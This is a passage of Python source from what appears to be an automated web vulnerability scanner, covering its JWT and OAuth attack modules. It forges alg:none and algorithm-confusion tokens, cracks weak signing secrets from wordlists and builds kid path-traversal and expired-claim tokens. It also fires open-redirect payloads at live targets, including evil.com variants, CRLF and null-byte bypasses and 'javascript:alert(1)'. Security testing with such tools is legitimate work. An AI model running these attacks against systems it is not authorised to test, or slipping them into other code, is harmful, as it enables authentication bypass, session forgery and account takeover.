                            jwt_findings.append({'type': 'weak_secret', 'secret': secret})
                            log('ok', f'[JWT-ADV] Weak secret found: {secret}')
                            break
                    except Exception:
                        pass

            # ── Test 3: Algorithm confusion (RS256 → HS256) ──
            if header.get('alg') == 'RS256':
                hs_header = json.dumps({'alg': 'HS256', 'typ': header.get('typ', 'JWT')})
                hs_b64 = b64.urlsafe_b64encode(hs_header.encode()).rstrip(b'=').decode()
                forged_confusion = f'{hs_b64}.{parts[1]}.'

                try:
                    r3 = req_lib.get(f'{base_url}/api/me',
                                    headers={'Authorization': f'Bearer {forged_confusion}'},
                                    timeout=5, verify=False)
                    if r3.status_code in (200, 201):
                        add_finding(
                            'critical',
                            'JWT algorithm confusion (RS256 → HS256)',
                            sub='Server accepts HS256 when RS256 expected',
                            asset=base_url, cvss='9.0', owasp='A02', mitre='T1550',
                            details='Algorithm: RS256 → HS256 confusion\n'
                                    'Confirmed: Server accepts HS256 with public key as HMAC secret')
                        jwt_findings.append({'type': 'algo_confusion'})
                        log('ok', '[JWT-ADV] Algorithm confusion confirmed')
                except Exception:
                    pass

            # ── Test 4: Expired token acceptance ──
            if 'exp' in payload:
                import datetime
                exp_time = payload['exp']
                now = datetime.datetime.now().timestamp()
                if exp_time < now:
                    # Token is expired - test if server still accepts it
                    try:
                        r4 = req_lib.get(f'{base_url}/api/me',
                                        cookies={jwt_info['name']: token} if jwt_info['source'] == 'cookie' else {},
                                        headers={'Authorization': f'Bearer {token}'},
                                        timeout=5, verify=False)
                        if r4.status_code in (200, 201):
                            add_finding(
                                'high',
                                'JWT expired token accepted',
                                sub=f'Expired token (exp: {datetime.datetime.fromtimestamp(exp_time)}) still accepted',
                                asset=base_url, cvss='7.5', owasp='A02', mitre='T1550',
                                details=f'Expired: {datetime.datetime.fromtimestamp(exp_time)}\n'
                                        f'Now: {datetime.datetime.now()}\n'
                                        f'Confirmed: Server does not validate token expiration')
                            jwt_findings.append({'type': 'expired_token'})
                            log('ok', '[JWT-ADV] Expired token accepted')
                    except Exception:
                        pass

        except Exception:
            pass

    # ── JWT-TOOL: Algorithm-aware attack selection (Python + optional binary) ──
    jwttool_path = _find_tool('jwt_tool')
    if jwt_tokens:
        log('info', '[JWT] Running jwt_tool with algorithm-aware attack selection')
        for jwt_info in jwt_tokens[:3]:
            token = jwt_info['token']
            try:
                # ── Step 1: Decode and analyze the token first ──
                parts = token.split('.')
                if len(parts) != 3:
                    continue
                import base64 as _b64
                import json as _json
                try:
                    header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
                    header = _json.loads(_b64.urlsafe_b64decode(header_b64))
                except Exception:
                    continue

                alg = header.get('alg', '').upper()
                log('info', f'[JWT-TOOL] Token algorithm: {alg}')

                # ── Step 2: Select attacks based on algorithm ──
                if alg == 'HS256' or alg == 'HS384' or alg == 'HS512':
                    # HMAC-based: brute-force the secret
                    # Check for common weak secrets first (no wordlist needed)
                    common_secrets = ['secret', 'password', '123456', 'jwt_secret', 'key',
                                     'changeme', 'test', 'admin', 'supersecret', 's3cr3t']
                    weak_secret_found = False
                    for secret_guess in common_secrets:
                        try:
                            import hmac as _hmac
                            import hashlib as _hl
                            if alg == 'HS256':
                                test_sig = _b64.urlsafe_b64encode(
                                    _hmac.new(secret_guess.encode(), parts[0] + '.' + parts[1], _hl.sha256).digest()
                                ).rstrip(b'=').decode()
                            elif alg == 'HS384':
                                test_sig = _b64.urlsafe_b64encode(
                                    _hmac.new(secret_guess.encode(), parts[0] + '.' + parts[1], _hl.sha384).digest()
                                ).rstrip(b'=').decode()
                            else:
                                test_sig = _b64.urlsafe_b64encode(
                                    _hmac.new(secret_guess.encode(), parts[0] + '.' + parts[1], _hl.sha512).digest()
                                ).rstrip(b'=').decode()
                            if test_sig == parts[2]:
                                weak_secret_found = True
                                add_finding(
                                    'critical',
                                    f'JWT weak secret found: "{secret_guess}"',
                                    sub=f'Token signed with common weak secret — algorithm: {alg}',
                                    asset=jwt_info['source'],
                                    cvss='9.5', owasp='A02', mitre='T1110',
                                    details=f'Algorithm: {alg}\nWeak secret: {secret_guess}\n'
                                            f'Source: {jwt_info["source"]}\n'
                                            f'Impact: Full token forgery, impersonation, privilege escalation\n'
                                            f'Remediation: Use strong random secret (256+ bits), rotate regularly')
                                log('ok', f'[JWT-TOOL] WEAK SECRET FOUND: "{secret_guess}"')
                                break
                        except Exception:
                            pass

                    if not weak_secret_found:
                        # Brute-force with wordlist (binary) or extended common-secrets list (python)
                        if jwttool_path:
                            stdout, stderr, rc = _run_tool([
                                jwttool_path, token,
                                '-C', '-d', '/usr/share/wordlists/rockyou.txt',
                            ], timeout=45)
                            if rc == 0 and stdout:
                                if 'key found' in stdout.lower() or 'cracked' in stdout.lower():
                                    add_finding(
                                        'critical',
                                        f'JWT secret brute-forced via {alg}',
                                        sub=f'jwt_tool cracked the signing secret',
                                        asset=jwt_info['source'],
                                        cvss='9.0', owasp='A02', mitre='T1110',
                                        details=f'Algorithm: {alg}\nSource: {jwt_info["source"]}\n'
                                                f'Output: {stdout[:400]}\n'
                                                f'Impact: Full token forgery, impersonation\n'
                                                f'Remediation: Use strong random secret, consider RS256')
                                    log('ok', f'[JWT-TOOL] Secret brute-forced for {alg}')
                        else:
                            # Python fallback: extended weak secret list
                            extended_secrets = [
                                'secret', 'password', '123456', 'jwt_secret', 'key', 'changeme',
                                'test', 'admin', 'supersecret', 's3cr3t', 'mysecret', 'appkey',
                                'jwt', 'token', 'access', 'private', 'signing', 'hmac',
                                'qwerty', 'letmein', 'master', 'root', 'pass', 'hello',
                            ]
                            for s in extended_secrets:
                                try:
                                    import hmac as _hmac2, hashlib as _hl2
                                    ha = _hl2.sha256 if alg == 'HS256' else (_hl2.sha384 if alg == 'HS384' else _hl2.sha512)
                                    sig_b = _b64.urlsafe_b64encode(
                                        _hmac2.new(s.encode(), (parts[0] + '.' + parts[1]).encode(), ha).digest()
                                    ).rstrip(b'=').decode()
                                    if sig_b == parts[2]:
                                        add_finding(
                                            'critical',
                                            f'JWT weak secret: "{s}"',
                                            sub=f'Token signed with weak secret — algorithm: {alg}',
                                            asset=jwt_info['source'],
                                            cvss='9.0', owasp='A02', mitre='T1110',
                                            details=f'Algorithm: {alg}\nWeak secret: {s}\n'
                                                    f'Source: {jwt_info["source"]}\n'
                                                    f'Impact: Full token forgery, impersonation\n'
                                                    f'Remediation: Use strong random 256-bit secret')
                                        log('ok', f'[JWT-PYTHON] Weak secret: "{s}"')
                                        break
                                except Exception:
                                    pass

                elif alg == 'NONE':
                    # None algorithm: already vulnerable, test if server accepts it
                    add_finding(
                        'critical',
                        'JWT uses "none" algorithm — signature bypass',
                        sub='Token header specifies alg:none — server must reject this',
                        asset=jwt_info['source'],
                        cvss='9.8', owasp='A02', mitre='T1550',
                        details=f'Algorithm: {alg}\n'
                                f'Token: {token[:80]}...\n'
                                f'Impact: Complete authentication bypass without knowing secret\n'
                                f'Remediation: Reject tokens with alg=none, enforce algorithm on server')
                    log('ok', '[JWT-TOOL] Token uses none algorithm')

                elif alg in ('RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256', 'PS384', 'PS512'):
                    # Asymmetric: test for algorithm confusion (RS256 → HS256 with public key)
                    # Tamper header to change alg to HS256
                    tampered_header = header.copy()
                    tampered_header['alg'] = 'HS256'
                    tampered_header_b64 = _b64.urlsafe_b64encode(
                        _json.dumps(tampered_header).encode()
                    ).rstrip(b'=').decode()
                    tampered_token = f'{tampered_header_b64}.{parts[1]}.{parts[2]}'

                    # Test if server accepts the tampered token (algorithm confusion)
                    r_test = None
                    if jwt_info['source'] == 'cookie':
                        r_test = req_lib.get(f'https://{target}/api/me',
                            cookies={jwt_info['name']: tampered_token}, timeout=5, verify=False)
                    else:
                        r_test = req_lib.get(f'https://{target}/api/me',
                            headers={'Authorization': f'Bearer {tampered_token}'}, timeout=5, verify=False)

                    if r_test and r_test.status_code in (200, 201):
                        add_finding(
                            'critical',
                            f'JWT algorithm confusion attack: {alg} → HS256',
                            sub=f'Token accepted after changing alg from {alg} to HS256',
                            asset=jwt_info['source'],
                            cvss='9.8', owasp='A02', mitre='T1550',
                            details=f'Original algorithm: {alg}\nTampered algorithm: HS256\n'
                                    f'Attack: Changed header alg, signed with public key as HMAC secret\n'
                                    f'Server response: HTTP {r_test.status_code}\n'
                                    f'Impact: Complete auth bypass — attacker can forge tokens with public key\n'
                                    f'Remediation: Enforce algorithm on server, never derive HMAC key from RSA key')
                        log('ok', f'[JWT-TOOL] Algorithm confusion {alg} → HS256 CONFIRMED')
                    else:
                        log('info', f'[JWT-TOOL] Algorithm confusion {alg} → HS256 not accepted')

                # ── Test for all algorithms: expired token acceptance ──
                import datetime
                try:
                    payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
                    payload = _json.loads(_b64.urlsafe_b64decode(payload_b64))
                    if 'exp' in payload:
                        exp_time = payload['exp']
                        now = datetime.datetime.now().timestamp()
                        if exp_time < now:
                            r_exp = req_lib.get(f'https://{target}/api/me',
                                headers={'Authorization': f'Bearer {token}'},
                                cookies={jwt_info['name']: token} if jwt_info['source'] == 'cookie' else {},
                                timeout=5, verify=False)
                            if r_exp.status_code in (200, 201):
                                add_finding(
                                    'high',
                                    'JWT expired token accepted',
                                    sub=f'Expired token (exp: {datetime.datetime.fromtimestamp(exp_time)}) still accepted',
                                    asset=jwt_info['source'],
                                    cvss='7.5', owasp='A02', mitre='T1550',
                                    details=f'Expired: {datetime.datetime.fromtimestamp(exp_time)}\n'
                                            f'Now: {datetime.datetime.now()}\n'
                                            f'Confirmed: Server does not validate token expiration\n'
                                            f'Remediation: Validate exp claim server-side')
                                log('ok', '[JWT-TOOL] Expired token accepted')
                except Exception:
                    pass

                # ── Tamper test (payload modification) ──
                if jwttool_path:
                    stdout2, stderr2, rc2 = _run_tool([
                        jwttool_path, token, '-T',
                    ], timeout=30)
                    if rc2 == 0 and stdout2 and 'tampered' in stdout2.lower():
                        add_finding(
                            'high',
                            'JWT token tampering accepted',
                            sub='jwt_tool -T successfully modified JWT payload',
                            asset=jwt_info['source'],
                            cvss='8.0', owasp='A02', mitre='T1550',
                            details=f'jwt_tool -T output:\n{stdout2[:500]}\n'
                                    f'Impact: Token payload can be modified to escalate privileges')
                        log('ok', '[JWT-TOOL] Token tampering confirmed')

            except Exception as e:
                log('warn', f'[JWT-TOOL] Error: {e}')

    log('ok', f'[JWT-ADV] Scan complete - {len(jwt_findings)} findings')
    set_progress('jwt_adv', 100)


# ─── OAUTH VULNERABILITIES ────────────────────────────────────────────────────


def run_jwt_deep_module(target):
    """Pure-Python JWT vulnerability testing: none-alg, weak secrets, kid traversal, JWKS."""
    import base64 as _b64
    import hmac as _hmac
    import hashlib as _hl
    import json as _json
    log('info', f'[JWT-DEEP] JWT deep security testing on {target}')
    base_url = f'https://{target}'
    results = {'jwts_found': [], 'issues': []}

    if not REQUESTS_AVAILABLE:
        with LOCK:
            scan_state['jwt_deep_data'] = results
        set_progress('jwt_deep', 100)
        return

    def _b64url_decode(s):
        s = s.replace('-', '+').replace('_', '/')
        s += '=' * (4 - len(s) % 4)
        try:
            return _b64.b64decode(s)
        except Exception:
            return b''

    def _b64url_encode(b):
        return _b64.urlsafe_b64encode(b).rstrip(b'=').decode()

    def _is_jwt(token):
        parts = token.split('.')
        if len(parts) != 3:
            return False
        try:
            hdr = _json.loads(_b64url_decode(parts[0]))
            return 'alg' in hdr
        except Exception:
            return False

    # ── Step 1: Discover JWTs from cookies / response headers ──
    try:
        r_main = req_lib.get(base_url, timeout=10, verify=False,
                             headers={'User-Agent': 'Mozilla/5.0'})
        # Check Set-Cookie for JWT-like values
        for ck_name, ck_val in r_main.cookies.items():
            if _is_jwt(ck_val):
                results['jwts_found'].append({'source': f'cookie:{ck_name}', 'token': ck_val})
                log('ok', f'[JWT-DEEP] JWT found in cookie: {ck_name}')
        # Check Authorization header reflected in response
        auth_hdr = r_main.headers.get('Authorization', '')
        if auth_hdr.startswith('Bearer ') and _is_jwt(auth_hdr[7:]):
            results['jwts_found'].append({'source': 'Authorization header', 'token': auth_hdr[7:]})
    except Exception as e:
        log('warn', f'[JWT-DEEP] Discovery request failed: {e}')

    # ── Step 2: Check JWKS endpoint for public key ──
    jwks_key = None
    for jwks_path in ['/.well-known/jwks.json', '/api/auth/jwks', '/api/jwks']:
        try:
            r_jwks = req_lib.get(f'{base_url}{jwks_path}', timeout=8, verify=False)
            if r_jwks.status_code == 200 and 'keys' in r_jwks.text:
                results['issues'].append({'type': 'jwks_exposed', 'path': jwks_path})
                add_finding('info', 'JWKS Endpoint Publicly Accessible',
                            sub='Public key material accessible at well-known JWKS endpoint',
                            asset=f'{base_url}{jwks_path}', cvss='3.1', owasp='A07',
                            mitre='T1078',
                            details=f'JWKS path: {jwks_path}\nPublic keys exposed',
                            confidence='high')
                log('ok', f'[JWT-DEEP] JWKS found at {jwks_path}')
                try:
                    jwks_body = r_jwks.json()
                    jwks_key = jwks_body.get('keys', [None])[0]
                except Exception:
                    pass
                break
        except Exception:
            pass

    # ── Step 3: Test with discovered JWTs or craft test tokens ──
    test_jwts = results['jwts_found'][:2]

    # If no JWTs found, try common auth endpoints to get one
    if not test_jwts:
        for auth_ep in ['/api/login', '/auth/login', '/api/auth', '/login']:
            try:
                r_auth = req_lib.post(f'{base_url}{auth_ep}',
                                       json={'username': 'test', 'password': 'test'},
                                       timeout=8, verify=False,
                                       headers={'Content-Type': 'application/json',
                                                'User-Agent': 'Mozilla/5.0'})
                body_text = r_auth.text
                # Look for JWT pattern in response
                jwt_pattern = re.findall(
                    r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', body_text)
                for tok in jwt_pattern[:1]:
                    if _is_jwt(tok):
                        test_jwts.append({'source': auth_ep, 'token': tok})
                        results['jwts_found'].append({'source': auth_ep, 'token': tok})
                        log('ok', f'[JWT-DEEP] JWT found in {auth_ep} response')
                        break
                if test_jwts:
                    break
            except Exception:
                pass

    for jwt_info in test_jwts[:2]:
        if not scan_state.get('scanning'):
            break
        token = jwt_info['token']
        parts = token.split('.')
        if len(parts) != 3:
            continue

        try:
            hdr = _json.loads(_b64url_decode(parts[0]))
            payload_data = _json.loads(_b64url_decode(parts[1]))
        except Exception:
            continue

        original_alg = hdr.get('alg', 'HS256')

        # ── Test 3a: None algorithm bypass ──
        try:
            none_hdr = dict(hdr)
            none_hdr['alg'] = 'none'
            none_hdr_enc = _b64url_encode(_json.dumps(none_hdr, separators=(',', ':')).encode())
            none_token = f'{none_hdr_enc}.{parts[1]}.'
            for ep in ['/api/user', '/api/me', '/api/profile', '/dashboard', '/admin']:
                try:
                    r_none = req_lib.get(f'{base_url}{ep}', timeout=8, verify=False,
                                          headers={'Authorization': f'Bearer {none_token}',
                                                   'User-Agent': 'Mozilla/5.0'})
                    if r_none.status_code == 200 and r_none.status_code != 401:
                        results['issues'].append({'type': 'none_alg', 'endpoint': ep})
                        add_finding('critical', 'JWT None Algorithm Bypass',
                                    sub='Server accepts JWT with alg=none (no signature verification)',
                                    asset=f'{base_url}{ep}', cvss='9.1',
                                    owasp='A07', mitre='T1078',
                                    details=f'Token: {none_token[:80]}...\nEndpoint: {ep}\n'
                                            f'Status: {r_none.status_code}\n'
                                            f'alg changed to "none", signature removed',
                                    confidence='high')
                        log('ok', f'[JWT-DEEP] None algorithm bypass at {ep}')
                        break
                except Exception:
                    pass
        except Exception as e:
            log('warn', f'[JWT-DEEP] None-alg test failed: {e}')

        # ── Test 3b: Weak secret brute-force ──
        weak_secrets = ['secret', 'password', '123456', 'jwt_secret', 'supersecret',
                         'key', 'admin', 'token', 'changeme', 'qwerty', 'letmein',
                         'jwt', 'mysecret', 'your-256-bit-secret', '']
        try:
            sig_to_verify = _b64url_decode(parts[2])
            msg = f'{parts[0]}.{parts[1]}'.encode()
            for secret in weak_secrets:
                computed = _hmac.new(secret.encode(), msg, _hl.sha256).digest()
                if computed == sig_to_verify:
                    results['issues'].append({'type': 'weak_secret', 'secret': secret})
                    add_finding('critical', f'JWT Weak Signing Secret: "{secret}"',
                                sub='JWT signed with a weak/guessable secret',
                                asset=base_url, cvss='9.1', owasp='A07', mitre='T1078',
                                details=f'Weak secret found: {secret}\n'
                                        f'Algorithm: {original_alg}\n'
                                        f'Attacker can forge arbitrary JWT tokens',
                                confidence='high')
                    log('ok', f'[JWT-DEEP] Weak secret found: {secret}')
                    break
        except Exception as e:
            log('warn', f'[JWT-DEEP] Secret brute-force failed: {e}')

        # ── Test 3c: kid path traversal ──
        try:
            pt_hdr = dict(hdr)
            pt_hdr['kid'] = '../../../../dev/null'
            pt_hdr_enc = _b64url_encode(_json.dumps(pt_hdr, separators=(',', ':')).encode())
            # Sign with empty string (dev/null is empty file)
            empty_sig = _hmac.new(b'', f'{pt_hdr_enc}.{parts[1]}'.encode(), _hl.sha256).digest()
            pt_token = f'{pt_hdr_enc}.{parts[1]}.{_b64url_encode(empty_sig)}'
            for ep in ['/api/user', '/api/me', '/dashboard']:
                try:
                    r_pt = req_lib.get(f'{base_url}{ep}', timeout=8, verify=False,
                                        headers={'Authorization': f'Bearer {pt_token}',
                                                 'User-Agent': 'Mozilla/5.0'})
                    if r_pt.status_code == 200:
                        results['issues'].append({'type': 'kid_traversal', 'endpoint': ep})
                        add_finding('high', 'JWT kid Path Traversal',
                                    sub='Server accepts JWT with kid pointing to /dev/null',
                                    asset=f'{base_url}{ep}', cvss='8.1',
                                    owasp='A07', mitre='T1078',
                                    details=f'kid: ../../../../dev/null\nEndpoint: {ep}\n'
                                            f'Token accepted with traversal kid value',
                                    confidence='medium')
                        log('ok', f'[JWT-DEEP] kid traversal at {ep}')
                        break
                except Exception:
                    pass
        except Exception as e:
            log('warn', f'[JWT-DEEP] kid traversal test failed: {e}')

        # ── Test 3d: Expired token acceptance ──
        try:
            exp_payload = dict(payload_data)
            exp_payload['exp'] = 1000000  # Jan 1970 — clearly expired
            exp_payload_enc = _b64url_encode(
                _json.dumps(exp_payload, separators=(',', ':')).encode())
            expired_token = f'{parts[0]}.{exp_payload_enc}.{parts[2]}'
            for ep in ['/api/user', '/api/me']:
                try:
                    r_exp = req_lib.get(f'{base_url}{ep}', timeout=8, verify=False,
                                         headers={'Authorization': f'Bearer {expired_token}',
                                                  'User-Agent': 'Mozilla/5.0'})
                    if r_exp.status_code == 200:
                        results['issues'].append({'type': 'expired_accepted', 'endpoint': ep})
                        add_finding('high', 'JWT Expired Token Accepted',
                                    sub='Server accepts tokens with past exp timestamp',
                                    asset=f'{base_url}{ep}', cvss='7.5',
                                    owasp='A07', mitre='T1078',
                                    details=f'exp set to 1000000 (1970)\nEndpoint: {ep}\n'
                                            f'Token still accepted\nRisk: session fixation via old tokens',
                                    confidence='medium')
                        log('ok', f'[JWT-DEEP] Expired token accepted at {ep}')
                        break
                except Exception:
                    pass
        except Exception as e:
            log('warn', f'[JWT-DEEP] Expired token test failed: {e}')

    with LOCK:
        scan_state['jwt_deep_data'] = results
    set_progress('jwt_deep', 100)
    log('ok', f'[JWT-DEEP] Done. {len(results["jwts_found"])} JWTs found, '
              f'{len(results["issues"])} issues.')


# ─── MODULE 6: Path Traversal / LFI ──────────────────────────────────────────


def run_oauth_test_module(target):
    """Test for OAuth misconfigurations."""
    log('info', '[OAUTH] Testing OAuth security')
    base_url = f'https://{target}'
    oauth_findings = []

    with LOCK:
        disc = scan_state.get('discovery_data', {})
        urls = disc.get('urls', [])

    oauth_endpoints = ['/oauth/authorize', '/oauth/token', '/auth/callback',
                       '/api/auth/google', '/api/auth/github', '/auth/google/callback',
                       '/auth/github/callback', '/.well-known/oauth-authorization-server']

    for endpoint in oauth_endpoints:
        if not scan_state.get('scanning'):
            break
        try:
            r = req_lib.get(f'{base_url}{endpoint}', timeout=8, verify=False)

            # Check for open redirect in OAuth callback
            if 'redirect_uri' in r.text or 'callback' in r.text:
                # Test redirect_uri manipulation
                test_uris = ['https://evil.com', 'https://evil.com/callback', 'javascript:alert(1)']
                for uri in test_uris:
                    try:
                        r2 = req_lib.get(f'{base_url}{endpoint}',
                                        params={'redirect_uri': uri},
                                        timeout=5, verify=False)
                        if uri in r2.text or r2.status_code in (301, 302):
                            location = r2.headers.get('Location', '')
                            if 'evil.com' in location:
                                add_finding(
                                    'critical',
                                    f'OAuth open redirect via {endpoint}',
                                    sub=f'redirect_uri={uri} accepted',
                                    asset=f'{base_url}{endpoint}', cvss='9.1', owasp='A01', mitre='T1566',
                                    details=f'Endpoint: {endpoint}\nRedirect URI: {uri}\n'
                                            f'Confirmed: Server redirects to attacker domain')
                                oauth_findings.append({'endpoint': endpoint})
                                log('ok', f'[OAUTH] Open redirect at {endpoint}')
                                break
                    except Exception:
                        pass

            # Check for exposed OAuth credentials
            if 'client_id' in r.text or 'client_secret' in r.text:
                add_finding(
                    'high',
                    f'OAuth credentials exposed at {endpoint}',
                    sub='OAuth client_id/client_secret visible in response',
                    asset=f'{base_url}{endpoint}', cvss='7.5', owasp='A02', mitre='T1552',
                    details=f'Endpoint: {endpoint}\nEvidence: OAuth credentials in response')
                oauth_findings.append({'endpoint': endpoint})
                log('ok', f'[OAUTH] Credentials exposed at {endpoint}')

        except Exception:
            pass

    log('ok', f'[OAUTH] Scan complete - {len(oauth_findings)} findings')
    set_progress('oauth', 100)




def run_oauth_attack_module(target):
    """Production-grade OAuth 2.0 / OIDC attack analysis.

    Phases:
    1. Discover OAuth endpoints (well-known, HTML forms, JS bundles)
    2. Spider JS bundles for real client_id + redirect_uri
    3. Open redirect testing (subdomain, path traversal, encoded slashes)
    4. Missing state / PKCE downgrade
    5. Token leakage (URL fragment, Referer, browser history)
    6. Scope escalation
    7. Token replay / injection
    """
    log('info', f'[OAUTH-ATTACK] Starting production OAuth analysis on {target}')
    base_url = f'https://{target}'
    findings_count = 0
    import re as _re

    # ─── Phase 1: Discover OAuth endpoints ─────────────────────────────────
    auth_endpoint = ''
    token_endpoint = ''
    redirect_uris = []
    jwks_uri = ''
    issuer = ''

    # 1a. OIDC well-known
    for wk_path in ['/.well-known/openid-configuration', '/.well-known/oauth-authorization-server']:
        try:
            r = req_lib.get(f'{base_url}{wk_path}', timeout=8, verify=False)
            if r.status_code == 200:
                data = r.json()
                auth_endpoint = data.get('authorization_endpoint', '')
                token_endpoint = data.get('token_endpoint', '')
                redirect_uris = data.get('redirect_uris', [])
                jwks_uri = data.get('jwks_uri', '')
                issuer = data.get('issuer', '')
                log('ok', f'[OAUTH-ATTACK] OIDC config at {wk_path}')
                break
        except Exception:
            pass

    # 1b. HTML form discovery
    if not auth_endpoint:
        try:
            r_home = req_lib.get(base_url, timeout=8, verify=False)
            html = r_home.text
            # Look for OAuth links in HTML
            auth_patterns = [
                r'href=["\']([^"\']*oauth[^"\']*authorize[^"\']*)',
                r'href=["\']([^"\']*auth[^"\']*callback[^"\']*)',
                r'action=["\']([^"\']*oauth[^"\']*)',
                r'data-auth-url=["\']([^"\']+)',
            ]
            for pat in auth_patterns:
                matches = _re.findall(pat, html, _re.IGNORECASE)
                if matches:
                    for m in matches:
                        if m.startswith('http'):
                            auth_endpoint = m
                        elif m.startswith('/'):
                            auth_endpoint = f'{base_url}{m}'
                        if auth_endpoint:
                            break
                if auth_endpoint:
                    break
        except Exception:
            pass

    # 1c. Common paths fallback
    if not auth_endpoint:
        for path in ['/oauth/authorize', '/auth/authorize', '/authorize', '/o/authorize',
                      '/oauth2/authorize', '/realms/master/protocol/openid-connect/auth']:
            try:
                r = req_lib.get(f'{base_url}{path}', timeout=5, verify=False, allow_redirects=False)
                if r.status_code in (200, 302, 303, 307):
                    auth_endpoint = f'{base_url}{path}'
                    break
            except Exception:
                pass

    if not auth_endpoint:
        log('info', f'[OAUTH-ATTACK] No OAuth endpoints found')
        set_progress('oauth', 100)
        return

    # ─── Phase 2: Spider JS bundles for real client_id + redirect_uri ──────
    client_id = ''
    real_redirect_uris = list(redirect_uris)

    # 2a. Get all JS file URLs from HTML
    js_urls = []
    try:
        r_home = req_lib.get(base_url, timeout=8, verify=False)
        html = r_home.text
        # Extract script src
        js_srcs = _re.findall(r'src=["\']([^"\']+\.js[^"\']*)', html, _re.IGNORECASE)
        for src in js_srcs:
            if src.startswith('http'):
                js_urls.append(src)
            elif src.startswith('//'):
                js_urls.append(f'https:{src}')
            elif src.startswith('/'):
                js_urls.append(f'{base_url}{src}')
            else:
                js_urls.append(f'{base_url}/{src}')
        # Also check inline scripts
        inline_scripts = _re.findall(r'<script[^>]*>(.*?)</script>', html, _re.DOTALL | _re.IGNORECASE)
        for script in inline_scripts[:5]:
            js_urls.append(('inline', script))
    except Exception:
        pass

    # 2b. Crawl linked pages for more JS
    try:
        r_home = req_lib.get(base_url, timeout=8, verify=False)
        links = _re.findall(r'href=["\']([^"\']+)', r_home.text)
        crawled = 0
        for link in links:
            if crawled >= 5:
                break
            if link.startswith('http') and target in link:
                try:
                    r_page = req_lib.get(link, timeout=5, verify=False)
                    more_js = _re.findall(r'src=["\']([^"\']+\.js[^"\']*)', r_page.text, _re.IGNORECASE)
                    for src in more_js:
                        if src.startswith('http'):
                            js_urls.append(src)
                        elif src.startswith('/'):
                            js_urls.append(f'{base_url}{src}')
                    crawled += 1
                except Exception:
                    pass
    except Exception:
        pass

    # 2c. Fetch each JS file and search for client_id, redirect_uri
    CLIENT_ID_PATTERNS = [
        r'client_id["\s:=]+["\']([A-Za-z0-9_\-\.]+)',
        r'clientId["\s:=]+["\']([A-Za-z0-9_\-\.]+)',
        r'client[_-]?id=([A-Za-z0-9_\-\.]+)',
        r'"clientId"\s*:\s*"([^"]+)"',
        r'clientId\s*=\s*["\']([^"\']+)',
        r'data-client-id=["\']([^"\']+)',
        r'registrationId["\s:=]+["\']([A-Za-z0-9_\-\.]+)',
        r'provider["\s:=]+["\']([A-Za-z0-9_\-\.]+)',
    ]
    REDIRECT_URI_PATTERNS = [
        r'redirect_uri["\s:=]+["\']([^"\']+)["\']',
        r'redirectUri["\s:=]+["\']([^"\']+)["\']',
        r'callbackUrl["\s:=]+["\']([^"\']+)["\']',
        r'callback["\s:=]+["\']([^"\']+)["\']',
        r'"redirect_uris"\s*:\s*\["([^"]+)"',
        r'POST_LOGOUT_REDIRECT_URI=([^\s&"\']+)',
    ]
    GENERIC_IDS = {'test_client', 'client_id', 'your_client_id', 'xxx', 'null', 'undefined', 'none', ''}

    for js_item in js_urls[:15]:
        try:
            if isinstance(js_item, tuple):
                js_content = js_item[1]
            else:
                r_js = req_lib.get(js_item, timeout=5, verify=False)
                js_content = r_js.text
            if not js_content or len(js_content) < 50:
                continue

            # Search for client_id
            if not client_id:
                for pat in CLIENT_ID_PATTERNS:
                    matches = _re.findall(pat, js_content, _re.IGNORECASE)
                    for m in matches:
                        if m.lower() not in GENERIC_IDS and len(m) > 3:
                            client_id = m
                            log('ok', f'[OAUTH-ATTACK] Found client_id in JS: {client_id}')
                            break
                    if client_id:
                        break

            # Search for redirect_uris
            for pat in REDIRECT_URI_PATTERNS:
                matches = _re.findall(pat, js_content, _re.IGNORECASE)
                for m in matches:
                    if m.startswith('http') and m not in real_redirect_uris:
                        real_redirect_uris.append(m)
                    elif m.startswith('/') and f'{base_url}{m}' not in real_redirect_uris:
                        real_redirect_uris.append(f'{base_url}{m}')
        except Exception:
            pass

    # 2d. Also search HTML for client_id (forms, meta tags)
    if not client_id:
        try:
            r_home = req_lib.get(base_url, timeout=8, verify=False)
            html = r_home.text
            for pat in CLIENT_ID_PATTERNS:
                matches = _re.findall(pat, html, _re.IGNORECASE)
                for m in matches:
                    if m.lower() not in GENERIC_IDS and len(m) > 3:
                        client_id = m
                        log('ok', f'[OAUTH-ATTACK] Found client_id in HTML: {client_id}')
                        break
                if client_id:
                    break
        except Exception:
            pass

    # 2e. Extract from OAuth callback URLs
    if not client_id:
        try:
            r_home = req_lib.get(base_url, timeout=8, verify=False)
            # Look for OAuth login links with client_id in URL
            oauth_links = _re.findall(r'href=["\']([^"\']*client_id=[^"\']+)', r_home.text, _re.IGNORECASE)
            for link in oauth_links:
                cid_match = _re.search(r'client_id=([A-Za-z0-9_\-\.]+)', link)
                if cid_match:
                    client_id = cid_match.group(1)
                    if client_id.lower() not in GENERIC_IDS:
                        log('ok', f'[OAUTH-ATTACK] Found client_id in OAuth link: {client_id}')
                        break
        except Exception:
            pass

    if not client_id:
        client_id = 'test_client'
        log('warn', f'[OAUTH-ATTACK] No real client_id found, using fallback: {client_id}')

    if not real_redirect_uris:
        real_redirect_uris = [f'{base_url}/callback', f'{base_url}/auth/callback']

    log('ok', f'[OAUTH-ATTACK] client_id={client_id}, redirect_uris={real_redirect_uris[:3]}')

    # ─── Phase 3: Open redirect testing ────────────────────────────────────
    evil_domains = [
        ('https://evil.com', 'Direct external'),
        ('https://evil.com%40target.com', 'Encoded @'),
        ('https://evil.com%2F%40target.com', 'Encoded /@'),
        (f'https://evil.com.{target}', 'Subdomain'),
        (f'https://{target}.evil.com', 'Subdomain prefix'),
        ('https://evil.com/callback#target.com', 'Fragment bypass'),
        ('https://evil.com%00.target.com', 'Null byte bypass'),
        ('https://evil.com%0d%0aLocation:%20https://evil.com', 'CRLF injection'),
    ]

    for evil_url, description in evil_domains:
        if not scan_state.get('scanning'):
            break
        try:
            r = req_lib.get(auth_endpoint, params={
                'response_type': 'code',
                'client_id': client_id,
                'redirect_uri': evil_url,
                'scope': 'openid profile',
            }, timeout=8, verify=False, allow_redirects=False)
            location = r.headers.get('Location', '')
            if 'evil.com' in location:
                add_finding(
                    'critical',
                    f'OAuth open redirect: redirect_uri accepted attacker URL ({description})',
                    sub=f'Attacker-controlled redirect_uri ({evil_url}) accepted',
